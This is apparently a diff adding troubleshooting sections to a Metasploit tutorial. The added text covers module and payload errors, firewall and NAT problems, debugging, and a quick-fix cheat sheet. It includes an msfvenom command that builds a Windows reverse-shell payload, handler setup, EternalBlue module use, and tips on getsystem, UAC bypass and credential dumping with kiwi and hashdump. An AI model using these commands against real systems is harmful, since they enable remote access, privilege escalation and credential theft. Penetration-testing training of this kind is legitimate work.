@@ -2710,4 +2710,115 @@ meterpreter > migrate 2528
   [*] Connected to msf.
   ```
   
+## 6. Module and Path Issues
+|Problem	|Likely Cause	|Solution|
+|----|-----|-----|
+|"Module not found"	|Typo or wrong path|	Use search [keyword] to find correct path|
+|"You have not set a payload"	|Payload not selected|	set payload windows/x64/meterpreter/reverse_tcp|
+|"Invalid parameter"	|Wrong syntax|	Check show options for correct parameter names|
+
+- **Example: Find a module by searching**
+ ```bash
+msf6 > search eternalblue
+* Use the exact path from search results
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+```
+
+## 7. Network and Firewall Issues
+|Problem|	Likely Cause	|Solution|
+|----|----|----|
+|Payload won't connect from external network|	Firewall blocking inbound	|Use reverse_https (port 443) which is often open|
+|Connection works, then drops	|Stateful firewall timing out|	Add pingback option to keep connection alive|
+|Can't reach target|	Wrong subnet|	Check IP and netmask. Use ip route to verify routing|
+|Target can't reach your listener	|NAT or firewall	|Use a VPS with public IP, or configure port forwarding|
+
+- **Example: Check if your LHOST is correct**
+```bash
+ * From target (or test VM)
+ping -c 3 192.168.1.5
+nc -zv 192.168.1.5 4444
+```
+
+
+## 8. Common Error Messages
+|Error|	Meaning	|Solution|
+|Could not connect to database|	PostgreSQL not running|	sudo systemctl start postgresql|
+|Command not found: [payload]	|Typo or wrong context|	You must be in use exploit/multi/handler before setting payload|
+|Session 1 is not a Meterpreter session|	Wrong session type	|Some exploits give a shell, not Meterpreter. Use sessions -u 1 to upgrade|
+|[-] Exploit aborted due to failure: no-target	|Target not set	|set RHOSTS [IP]|
+|[-] Unable to proceed: No payload configured	|Payload not set	set |payload [path]|
+
+
+## 9. Debugging Tips
+
+- Enable verbose output:
+  ```bash
+  set VERBOSE true
+  ```
+- Enable full debugging:
+  ```bash
+  set DEBUG true
+  ```
+- Check logs:
+  ```bash
+  cat ~/.msf4/logs/framework.log | tail -50
+  ```
+- Test payload standalone:
+  - Generate a test payload
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o test.exe    
+    ```
+  - Start handler
+    ```bash
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST 192.168.1.5
+    set LPORT 4444
+    run
+    ```
+  - Run test.exe on a test VM
+
+
+
+## 10. Quick Troubleshooting Flowchart
+
+- **1. Payload runs but no session?**
+    ├── Check LHOST (is it your IP?)
+    ├── Check LPORT (is your firewall blocking it?)
+    ├── Check handler (is it running?)
+    └── Check network (can target reach you?)
+
+- **2. Exploit fails?**
+    ├── Check RHOSTS (typo? correct target?)
+    ├── Check RPORT (is service running?)
+    ├── Check target type (`show targets`)
+    ├── Check if target is patched
+    └── Try `check` before `run`
+
+- **3. Meterpreter fails?**
+    ├── `getuid` -> check current user
+    ├── `sysinfo` -> check OS and architecture
+    ├── Migrate to a stable process
+    ├── Use `getsystem` for privileges
+    └── Load `kiwi` for credentials
+
+- **4. Database not working?**
+    ├── `sudo systemctl start postgresql`
+    ├── `msfconsole -d`
+    ├── `db_status`
+    └── `workspace` to verify workspace
+
+
+## Troubleshooting Cheat Sheet
+|Problem	|Quick Fix|
+|----|----|
+|No session|	Check LHOST, LPORT, firewall|
+|Database error	|sudo systemctl start postgresql|
+|Module not found	|search [keyword]|
+|Wrong payload|	show payloads|
+|Target not vulnerable|	check, try different exploit|
+|Session not Meterpreter|	sessions -u [ID] (upgrade)|
+|getsystem fails|	Try UAC bypass first|
+|hashdump fails|	load kiwi; creds_all|
+|Connection drops	|Use reverse_https|
 
